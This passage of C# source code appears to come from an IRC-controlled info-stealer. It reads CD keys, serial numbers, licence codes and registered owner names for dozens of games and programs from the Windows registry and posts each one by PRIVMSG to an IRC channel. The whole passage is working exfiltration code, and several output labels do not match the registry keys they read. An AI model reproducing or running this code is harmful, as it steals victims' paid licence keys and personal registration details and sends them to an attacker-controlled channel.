                string str92 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\3d0\Status Legends of Might and Magic", "CustomerNumber", null).ToString();
                if (str92 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Status Legends of Might and Magic: " + str92);
                }
            }
            catch
            {
            }
            try
            {
                string str93 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Flash\7\Registration", "Serial Number", null).ToString();
                if (str93 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Macromedia Flash 7: " + str93);
                }
            }
            catch
            {
            }
            try
            {
                string str94 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Fireworks\7\Registration", "Serial Number", null).ToString();
                if (str94 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Macromedia Fireworks 7: " + str94);
                }
            }
            catch
            {
            }
            try
            {
                string str95 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Dreamweaver\7\Registration", "Serial Number", null).ToString();
                if (str95 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Macromedia Dreamweaver 7: " + str95);
                }
            }
            catch
            {
            }
            try
            {
                string str96 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Madden NFL 07", "ergc", null).ToString();
                if (str96 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Madden NFL 07: " + str96);
                }
            }
            catch
            {
            }
            try
            {
                string str97 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\JSG\Matrix Saver V2", "Registration", null).ToString();
                if (str97 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Matrix Screensaver: " + str97);
                }
            }
            catch
            {
            }
            try
            {
                string str98 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Medal of Honor Airborne", "Product GUID", null).ToString();
                if (str98 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medal of Honor: Airborne: " + str98);
                }
            }
            catch
            {
            }
            try
            {
                string str99 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault", "ergc", null).ToString();
                if (str99 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medal of Honor: Allied Assault: " + str99);
                }
            }
            catch
            {
            }
            try
            {
                string str100 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Breakthrough", "ergc", null).ToString();
                if (str100 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medal of Honor: Allied Assault: " + str100);
                }
            }
            catch
            {
            }
            try
            {
                string str101 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Spearhead", "ergc", null).ToString();
                if (str101 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medal of Honor: Allied Assault: Breakthrough: " + str101);
                }
            }
            catch
            {
            }
            try
            {
                string str102 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Medal of Honor: Heroes 2", "ergc", null).ToString();
                if (str102 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medal of Honor: Allied Assault: Spearhead: " + str102);
                }
            }
            catch
            {
            }
            try
            {
                string str103 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\mIRC", "UserName", null).ToString();
                if (str103 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Medal of Honor: Heroes 2: " + str103);
                }
            }
            catch
            {
            }
            try
            {
                string str104 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\mIRC", "License", null).ToString();
                if (str104 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  mIRC: " + str104);
                }
            }
            catch
            {
            }
            try
            {
                string str105 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Nascar Racing 2002", "ergc", null).ToString();
                if (str105 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Nascar Racing 2002: " + str105);
                }
            }
            catch
            {
            }
            try
            {
                string str106 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Nascar Racing 2003", "ergc", null).ToString();
                if (str106 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Nascar Racing 2003: " + str106);
                }
            }
            catch
            {
            }
            try
            {
                string str107 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2002", "ergc", null).ToString();
                if (str107 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NHL 2002: " + str107);
                }
            }
            catch
            {
            }
            try
            {
                string str108 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 2003", "ergc", null).ToString();
                if (str108 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NBA LIVE 2003: " + str108);
                }
            }
            catch
            {
            }
            try
            {
                string str109 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 2004", "ergc", null).ToString();
                if (str109 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NBA LIVE 2004: " + str109);
                }
            }
            catch
            {
            }
            try
            {
                string str110 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 07", "ergc", null).ToString();
                if (str110 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NBA LIVE 07: " + str110);
                }
            }
            catch
            {
            }
            try
            {
                string str111 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA Live 08", "ergc", null).ToString();
                if (str111 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NBA Live 08: " + str111);
                }
            }
            catch
            {
            }
            try
            {
                string str112 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed Carbon", "ergc", null).ToString();
                if (str112 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Need for Speed Carbon: " + str112);
                }
            }
            catch
            {
            }
            try
            {
                string str113 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Hot Pursuit 2", "ergc", null).ToString();
                if (str113 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Need For Speed Hot Pursuit 2: " + str113);
                }
            }
            catch
            {
            }
            try
            {
                string str114 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need for Speed Most Wanted", "ergc", null).ToString();
                if (str114 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Need for Speed Most Wanted: " + str114);
                }
            }
            catch
            {
            }
            try
            {
                string str115 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed ProStreet", "ergc", null).ToString();
                if (str115 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Need for Speed ProStreet: " + str115);
                }
            }
            catch
            {
            }
            try
            {
                string str116 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Underground", "ergc", null).ToString();
                if (str116 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Need For Speed Underground: " + str116);
                }
            }
            catch
            {
            }
            try
            {
                string str117 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Need for Speed Underground 2", "ergc", null).ToString();
                if (str117 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Need for Speed Underground 2: " + str117);
                }
            }
            catch
            {
            }
            try
            {
                string str118 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\Nero - Burning Rom\Info", "Serial6", null).ToString();
                if (str118 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Nero - Burning Rom: " + str118);
                }
            }
            catch
            {
            }
            try
            {
                string str119 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Nero\Installation\Families\Nero 7\Info", "Serial7_1191197813", null).ToString();
                if (str119 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Nero 7: " + str119);
                }
            }
            catch
            {
            }
            try
            {
                string str120 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Nero\Installation\Families\Nero 8\Info", "Serial8_1194709660", null).ToString();
                if (str120 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Nero 8: " + str120);
                }
            }
            catch
            {
            }
            try
            {
                string str121 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2002", "ergc", null).ToString();
                if (str121 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NHL 2002: " + str121);
                }
            }
            catch
            {
            }
            try
            {
                string str122 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2003", "ergc", null).ToString();
                if (str122 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NHL 2003: " + str122);
                }
            }
            catch
            {
            }
            try
            {
                string str123 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2004", "ergc", null).ToString();
                if (str123 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NHL 2004: " + str123);
                }
            }
            catch
            {
            }
            try
            {
                string str124 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2005", "ergc", null).ToString();
                if (str124 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NHL 2005: " + str124);
                }
            }
            catch
            {
            }
            try
            {
                string str125 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Westwood\Nox", "Serial", null).ToString();
                if (str125 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  NOX: " + str125);
                }
            }
            catch
            {
            }
            try
            {
                string str126 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\NuMega\SmartCheck", "Serial", null).ToString();
                if (str126 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Numega SmartCheck: " + str126);
                }
            }
            catch
            {
            }
            try
            {
                string str127 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\OnlineTVPlayer\RegInfo", "name", null).ToString();
                if (str127 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  OnlineTVPlayer (Name): " + str127);
                }
            }
            catch
            {
            }
            try
            {
                string str128 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\OnlineTVPlayer\RegInfo", "serial", null).ToString();
                if (str128 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  OnlineTVPlayer (Serial): " + str128);
                }
            }
            catch
            {
            }
            try
            {
                string str129 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "User", null).ToString();
                if (str129 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  O&O Defrag 8.0 (Username): " + str129);
                }
            }
            catch
            {
            }
            try
            {
                string str130 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "Company", null).ToString();
                if (str130 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  O&O Defrag 8.0 (Company): " + str130);
                }
            }
            catch
            {
            }
            try
            {
                string str131 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "SerialNo", null).ToString();
                if (str131 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  O&O Defrag 8.0 (Serial): " + str131);
                }
            }
            catch
            {
            }
            try
            {
                string str132 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\PowerQuest\PartitionMagic\8.0\UserInfo", "SerialNumber", null).ToString();
                if (str132 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Partition Magic 8.0: " + str132);
                }
            }
            catch
            {
            }
            try
            {
                string str133 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "Name", null).ToString();
                if (str133 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Passware Encryption Analyzer (Name): " + str133);
                }
            }
            catch
            {
            }
            try
            {
                string str134 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "SerialNumber", null).ToString();
                if (str134 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Passware Encryption Analyzer (License): " + str134);
                }
            }
            catch
            {
            }
            try
            {
                string str135 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "Serial", null).ToString();
                if (str135 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Passware Encryption Analyzer (Serial): " + str135);
                }
            }
            catch
            {
            }
            try
            {
                string str136 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "License", null).ToString();
                if (str136 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Passware Windows Key (License): " + str136);
                }
            }
            catch
            {
            }
            try
            {
                string str137 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "Name", null).ToString();
                if (str137 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Passware Windows Key (Name): " + str137);
                }
            }
            catch
            {
            }
            try
            {
                string str138 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "Serial", null).ToString();
                if (str138 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Passware Windows Key (Serial): " + str138);
                }
            }
            catch
            {
            }
            try
            {
                string str139 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\CyberLink\PowerDVD", "UI_RMK", null).ToString();
                if (str139 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  PowerDvD: " + str139);
                }
            }
            catch
            {
            }
            try
            {
                string str140 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\EnTech\PowerStrip", "Key", null).ToString();
                if (str140 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  PowerStrip: " + str140);
                }
            }
            catch
            {
            }
            try
            {
                string str141 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\KONAMI\PES2008", "code", null).ToString();
                if (str141 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Pro Evolution Soccer 2008: " + str141);
                }
            }
            catch
            {
            }
            try
            {
                string str142 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Red Storm Entertainment\RAVENSHIELD", "CDKey", null).ToString();
                if (str142 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Rainbow Six III RavenShield: " + str142);
                }
            }
            catch
            {
            }
            try
            {
                string str143 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Shogun Total War - Warlord Edition", "ergc", null).ToString();
                if (str143 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Shogun Total War Warlord Edition: " + str143);
                }
            }
            catch
            {
            }
            try
            {
                string str144 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Atari\Sid Meier's Pirates!", "CDKey", null).ToString();
                if (str144 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Sid(Meier) 's Pirates!: " + str144);
                }
            }
            catch
            {
            }
            try
            {
                string str145 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Ubisoft\SILENT HUNTER III\Keys", "DiscKey_SH3", null).ToString();
                if (str145 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Sid(Meier) 's Pirates!: " + str145);
                }
            }
            catch
            {
            }
            try
            {
                string str146 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\Maxis\ Sim City 4 Deluxe", "ergc", null).ToString();
                if (str146 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Sim City 4 Deluxe: " + str146);
                }
            }
            catch
            {
            }
            try
            {
                string str147 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\Maxis\ Sim City 4", "ergc", null).ToString();
                if (str147 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Sim City 4: " + str147);
                }
            }
            catch
            {
            }
            try
            {
                string str148 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Network Associates, Inc.\Sniffer Pro\4.5\USER", "SerialNumber", null).ToString();
                if (str148 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Sniffer Pro 4.5: " + str148);
                }
            }
            catch
            {
            }
            try
            {
                string str149 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Silver Style Entertainment\Soldiers Of Anarchy", "Settings", null).ToString();
                if (str149 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Soldiers Of Anarchy: " + str149);
                }
            }
            catch
            {
            }
            try
            {
                string str150 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Silver Style Entertainment\Soldiers Of Anarchy", "Settings", null).ToString();
                if (str150 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Soldiers Of Anarchy: " + str150);
                }
            }
            catch
            {
            }
            try
            {
                string str151 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\GSC Game World\STALKER-SHOC", "InstallCDKEY", null).ToString();
                if (str151 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Stalker - Shadow of Chernobyl: " + str151);
                }
            }
            catch
            {
            }
            try
            {
                string str152 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\LucasArts\Star Wars Battlefront II\1.0", "CD Key", null).ToString();
                if (str152 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Star Wars Battlefront II (v1.0): " + str152);
                }
            }
            catch
            {
            }
            try
            {
                string str153 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\LucasArts\Star Wars Battlefront II\1.1", "CD Key", null).ToString();
                if (str153 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Star Wars Battlefront II (v1.1): " + str153);
                }
            }
            catch
            {
            }
            try
            {
                string str154 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Steganos\SIAVPN", "ClientID", null).ToString();
                if (str154 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Steganos Internet Anonym VPN: " + str154);
                }
            }
            catch
            {
            }
            try
            {
                string str155 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Steganos\SIAVPN", "ClientID", null).ToString();
                if (str155 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Splinter Cell Pandora Tomorrow: " + str155);
                }
            }
            catch
            {
            }
            try
            {
                string str156 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\THQ\Gas Powered Games\Supreme Commander", "KEY", null).ToString();
                if (str156 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Surpreme Commander: " + str156);
                }
            }
            catch
            {
            }
            try
            {
                string str157 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat2", null).ToString();
                if (str157 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  S.W.A.T 2: " + str157);
                }
            }
            catch
            {
            }
            try
            {
                string str158 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat3", null).ToString();
                if (str158 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  S.W.A.T 3: " + str158);
                }
            }
            catch
            {
            }
            try
            {
                string str159 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "swat4", null).ToString();
                if (str159 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  S.W.A.T 4: " + str159);
                }
            }
            catch
            {
            }
            try
            {
                string str160 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegisteredTo", null).ToString();
                if (str160 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TechSmith SnagIt (Name): " + str160);
                }
            }
            catch
            {
            }
            try
            {
                string str161 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegistrationKey", null).ToString();
                if (str161 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TechSmith SnagIt (Name): " + str161);
                }
            }
            catch
            {
            }
            try
            {
                string str162 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TechSmith\SnagIt\8", "RegistrationKey", null).ToString();
                if (str162 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TechSmith SnagIt (Serial): " + str162);
                }
            }
            catch
            {
            }
            try
            {
                string str163 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TexasCalc\License", "Owner Name", null).ToString();
                if (str163 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Texas Calculatem 4 (Owner): " + str163);
                }
            }
            catch
            {
            }
            try
            {
                string str164 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TexasCalc\License", "Registration Key", null).ToString();
                if (str164 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Texas Calculatem 4 (Owner): " + str164);
                }
            }
            catch
            {
            }
            try
            {
                string str165 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA Games\The Battle for Middle-earth", "ergc", null).ToString();
                if (str165 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Battle for Middle-earth: " + str165);
                }
            }
            catch
            {
            }
            try
            {
                string str166 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA Games\The Orange Box", "ergc", null).ToString();
                if (str166 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Orange Box: " + str166);
                }
            }
            catch
            {
            }
            try
            {
                string str167 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Sierra\CDKey", "Timeshift", null).ToString();
                if (str167 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  The Orange Box: " + str167);
                }
            }
            catch
            {
            }
            try
            {
                string str168 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Pegasys Inc.\TMPGEnc DVD Author\1.0", "RegistrationCode", null).ToString();
                if (str168 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TMPGEnc DVD Author: " + str168);
                }
            }
            catch
            {
            }
            try
            {
                string str169 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "UserName", null).ToString();
                if (str169 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2007 (Name): " + str169);
                }
            }
            catch
            {
            }
            try
            {
                string str170 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "RegCode", null).ToString();
                if (str170 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2007 (Key): " + str170);
                }
            }
            catch
            {
            }
            try
            {
                string str171 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\6.0", "Company", null).ToString();
                if (str171 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2007 (Company): " + str171);
                }
            }
            catch
            {
            }
            try
            {
                string str172 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "UserName", null).ToString();
                if (str172 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2008 (Name): " + str172);
                }
            }
            catch
            {
            }
            try
            {
                string str173 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "RegCode", null).ToString();
                if (str173 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2008 (Key): " + str173);
                }
            }
            catch
            {
            }
            try
            {
                string str174 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\7.0", "Company", null).ToString();
                if (str174 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2008 (Company): " + str174);
                }
            }
            catch
            {
            }
            try
            {
                string str175 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "UserName", null).ToString();
                if (str175 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2009 (Name): " + str175);
                }
            }
            catch
            {
            }
            try
            {
                string str176 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "ProductKey", null).ToString();
                if (str176 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2009 (Key): " + str176);
                }
            }
            catch
            {
            }
            try
            {
                string str177 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\TuneUp\Utilities\8.0", "Company", null).ToString();
                if (str177 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  TuneUp 2009 (Company): " + str177);
                }
            }
            catch
            {
            }
            try
            {
                string str178 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Nullsoft\Winamp", "regname", null).ToString();
                if (str178 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Winamp (Username): " + str178);
                }
            }
            catch
            {
            }
            try
            {
                string str179 = Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Nullsoft\Winamp", "regkey", null).ToString();
                if (str179 != null)
                {
                    Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " : 9  Winamp (Serial): " + str179);
                }
            }
            catch
            {
            }

        	
        }
    }
}